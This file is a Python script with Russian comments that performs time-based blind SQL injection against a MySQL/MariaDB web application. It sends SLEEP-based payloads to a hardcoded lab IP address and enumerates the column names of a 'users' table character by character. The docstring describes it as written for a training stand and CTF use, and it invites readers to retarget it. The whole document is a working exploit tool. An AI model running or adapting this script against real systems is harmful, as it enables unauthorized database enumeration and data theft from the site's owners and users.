"""
=============================================================================
 perebor_kolonok_v_table.py — Time-Based Blind SQLi: имена колонок таблицы
=============================================================================

ЗАЧЕМ:
    Посимвольно извлекает названия колонок таблицы через слепую инъекцию по
    времени (SLEEP). Использует information_schema.columns и IF(...,SLEEP(1),0):
    если символ угадан — сервер «зависает» на 1 сек, что и детектируется.

ГДЕ ПРИМЕНИМО:
    Слепая SQLi без вывода данных и без различимого true/false в теле ответа,
    но с возможностью выполнить SLEEP() (Time-Based Blind), СУБД MySQL/MariaDB.

ЗАПУСК:
    python3 perebor_kolonok_v_table.py

ОГРАНИЧЕНИЯ / ЗАМЕЧАНИЯ:
    - Значения ЗАХАРДКОЖЕНЫ под учебный стенд: TARGET_URL, схема 'sql_order_db',
      таблица 'users', параметр 'name', max_columns=2. Меняйте под свою цель.
    - DELAY_THRESHOLD=1.0 при SLEEP(1) — на нестабильной сети возможны ложные
      срабатывания; увеличьте SLEEP и порог при «шуме».
    - Медленно (по запросу на каждый символ×алфавит). Только для авторизованных
      целей / CTF.
=============================================================================
"""
import requests
import time

# Конфигурация
TARGET_URL = "http://172.23.24.164"
DELAY_THRESHOLD = 1.0  # Порог задержки (секунды)
CHARSET = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_"

def get_column_names():
    column_names = []
    max_columns = 2  # У нас 2 колонки
    
    for column_index in range(max_columns):
        current_column = ""
        position = 1
        
        while True:
            found_char = False
            
            for char in CHARSET:
                # Полезная нагрузка для проверки символа
                payload = (
                    f"592173392' AND IF("
                    f"SUBSTRING("
                    f"(SELECT column_name FROM information_schema.columns "
                    f"WHERE table_schema='sql_order_db' AND table_name='users' "
                    f"LIMIT 1 OFFSET {column_index}), "
                    f"{position},1)='{char}', "
                    f"SLEEP(1), 0)-- -"
                )
                
                data = {"name": payload}
                
                start_time = time.time()
                response = requests.post(TARGET_URL, data=data)
                elapsed_time = time.time() - start_time
                
                if elapsed_time >= DELAY_THRESHOLD:
                    current_column += char
                    print(f"[+] Колонка {column_index + 1}: {current_column}")
                    found_char = True
                    break
            
            if not found_char:
                break  # Достигнут конец названия колонки
            
            position += 1
        
        column_names.append(current_column)
    
    return column_names

if __name__ == "__main__":
    print("[*] Начинаем перебор названий колонок...")
    columns = get_column_names()
    print("\n[+] Найдены колонки:")
    for i, column in enumerate(columns, 1):
        print(f"Колонка {i}: {column}")
